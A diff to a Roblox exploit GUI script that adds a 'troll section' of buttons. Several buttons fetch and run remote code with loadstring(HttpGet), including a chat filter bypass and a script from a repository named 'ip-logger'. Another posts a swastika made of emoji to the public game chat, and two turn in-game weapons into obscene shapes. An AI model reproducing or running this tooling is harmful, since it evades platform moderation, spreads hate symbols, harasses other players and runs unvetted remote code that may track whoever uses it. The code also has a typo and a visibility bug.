@@ -1,19 +1,35 @@
 local gui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
 gui.ResetOnSpawn = false
 local frame = Instance.new("Frame", gui)
+local frame1 = Instance.new("Frame", frame)
 local button = Instance.new("TextButton", frame)
 local button1 = Instance.new("TextButton", frame)
 local button2 = Instance.new("TextButton", frame)
 local button3 = Instance.new("TextButton", frame)
 local button4 = Instance.new("TextButton", frame)
 local button5 = Instance.new("TextButton", frame)
+local button6 = Instance.new("TextButton", frame1)
+local button7 = Instance.new("TextButton", frame1)
+local button8 = Instance.new("TextButton", frame1)
+local button9 = Instance.new("TextButton", frame1)
+local button10 = Instance.new("TextButton", frame1)
+local button11 = Instance.new("TextButton", frame1)
 local text = Instance.new("TextLabel", frame)
 local text1 = Instance.new("TextLabel", frame)
+local text2 = Instance.new("TextLabel", frame1)
+local downbutton = Instance.new("TextButton", frame)
+local upbutton = Instance.new("TextButton", frame)
 
 frame.Size = UDim2.new(0.3,0,0.3,0)
 frame.Position = UDim2.new(0,675,0,61)
 frame.Draggable = true
 frame.Active = true
+
+frame1.Size = UDim2.new(1,0,0.5,0)
+frame1.Position = UDim2.new(0,-1,0,285)
+frame1.Draggable = false
+frame1.Active = true
+frame1.Visible = false
 
 button.Size = UDim2.new(0.3,0,0.3,0)
 button.Position = UDim2.new(0,3,0,78)
@@ -51,6 +67,64 @@ button5.Draggable = false
 button5.Active = true
 button5.Text = "HITBOX EXPANDER"
 
+button6.Size = UDim2.new(0.28,0,0.23,0)
+button6.Position = UDim2.new(0,10,0,42)
+button6.Draggable = false
+button6.Active = true
+button6.Text = "CHAT BYPASSER"
+button6.Visible = false
+
+button7.Size = UDim2.new(0.28,0,0.23,0)
+button7.Position = UDim2.new(0,195,0,42)
+button7.Draggable = false
+button7.Active = true
+button7.Text = "nazi symbol in chat"
+button7.Visible = false
+
+button8.Size = UDim2.new(0.28,0,0.23,0)
+button8.Position = UDim2.new(0,387,0,42)
+button8.Draggable = false
+button8.Active = true
+button8.Text = "fe flip"
+button8.Visible = false
+
+button9.Size = UDim2.new(0.28,0,0.23,0)
+button9.Position = UDim2.new(0,10,0,90)
+button9.Draggable = true
+button9.Active = true
+button9.Text = "be a ball KICK RISK"
+button9.Visible = false
+
+button10.Size = UDim2.new(0.28,0,0.23,0)
+button10.Position = UDim2.new(0,195,0,90)
+button10.Draggable = false
+button10.Active = true
+button10.Text = "penis shotgun"
+button10.Visible = false
+
+button11.Size = UDim2.new(0.28,0,0.23,0)
+button11.Position = UDim2.new(0,387,0,90)
+button11.Draggable = false
+button11.Active = true
+button11.Text = "penis hammer"
+button11.Visible = false
+
+downbutton.Size = UDim2.new(0.2,0,0.1,0)
+downbutton.Position = UDim2.new(0,224,0,285)
+downbutton.Draggable = false
+downbutton.Active = true
+downbutton.Text = "V"
+
+
+
+upbutton.Size = UDim2.new(0.2,0,0.1,0)
+upbutton.Position = UDim2.new(0,224,0,286)
+upbutton.Draggable = false
+upbutton.Active = true
+upbutton.Text = "^"
+upbutton.TextSize = "14"
+upbutton.Visible = false
+
 text.Size = UDim2.new(0.3,0,0.3,0)
 text.Position = UDim2.new(0,198,0,-3)
 text.Draggable = false
@@ -66,6 +140,15 @@ text1.Active = false
 text1.BackgroundTransparency = 1
 text1.Text = "MADE BY HAXAREBEST2"
 text1.TextSize = 30
+
+text2.Size = UDim2.new(0.3,0,0.3,0)
+text2.Position = UDim2.new(0,224,0,-6)
+text2.Draggable = false
+text2.Active = false
+text2.BackgroundTransparency = 1
+text2.Text = "troll            section"
+text2.TextSize = 30
+text2.Visible = false
 
 
 button.MouseButton1Click:Connect(function()
@@ -105,4 +188,87 @@ end)
 
 button5.MouseButton1Click:Connect(function()
 loadstring(game:HttpGet("https://pastebin.com/raw/LWuVzYJY"))()
+end)
+
+downbutton.MouseButton1Click:Connect(function()
+frame1.Visible = true
+text2.Visible = true
+upbutton.Visible = true
+downbutton.Visible = false
+button6.Visible = true
+button7.Visible = true
+button8.Visible = true
+button9.Visible = true
+button10.Visible = true
+button11.Visible = true
+end)
+
+upbutton.MouseButton1Click:Connect(function()
+frame1.Visible = false
+text2.Visible = false
+upbutton.Visible = false
+downbutton.Visible = true
+button6.Visible = false
+button7.Visible = true
+button8.Visible = false
+button9.Visible = false
+button10.Visible = false
+button11.Vsiisble = false
+end)
+
+button6.MouseButton1Click:connect(function()
+game.StarterGui:SetCore("SendNotification", {
+    Title = "KEY IS levelup";
+    Text = "KEY IS levelup";
+    Duration = 7
+    })
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fearlessd3v/TEAM-FEARLESS/refs/heads/main/fearless-chat-bypass"))()
+end)
+
+button7.MouseButton1Click:Connect(function()
+local TextChatService = game:GetService("TextChatService")
+
+
+local function sendChatMessage(message)
+    local chatChannel = TextChatService.TextChannels.RBXGeneral
+    if chatChannel then
+        chatChannel:SendAsync(message)
+    else
+        warn("Chat channel RBXGeneral not found.")
+    end
+end
+
+sendChatMessage("🔴⚪⚪🔴🔴🔴🔴")
+sendChatMessage("🔴⚪⚪🔴⚪⚪⚪")
+sendChatMessage("🔴⚪⚪🔴⚪⚪⚪")
+sendChatMessage("🔴🔴🔴🔴🔴🔴🔴")
+sendChatMessage("⚪⚪⚪🔴⚪⚪🔴")
+sendChatMessage("⚪⚪⚪🔴⚪⚪🔴")
+sendChatMessage("🔴🔴🔴🔴⚪⚪🔴")
+end)
+
+button8.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thiccnegative123/ip-logger/refs/heads/main/fe%20flip"))();
+end)
+
+button9.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/BZr9bGDy", true))()
+end)
+
+button10.MouseButton1Click:Connect(function()
+local sword = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Remington 870")
+if sword then
+    sword.Grip = CFrame.new(0.900000036, 2.0999999, 0.800000012, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+else
+    warn("Sword not found in Backpack!")
+end
+end)
+
+button11.MouseButton1Click:Connect(function()
+local sword = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Hammer")
+if sword then
+    sword.Grip = CFrame.new(1.60000002, 1.39999998, 1.69999433, 0.0139333103, 0.995037258, 0.0985232815, 0.139333099, -0.0995036513, 0.985233605, 0.990147591, -1.12930119e-08, -0.140028074)
+else
+    warn("Sword not found in Backpack!")
+end
 end)
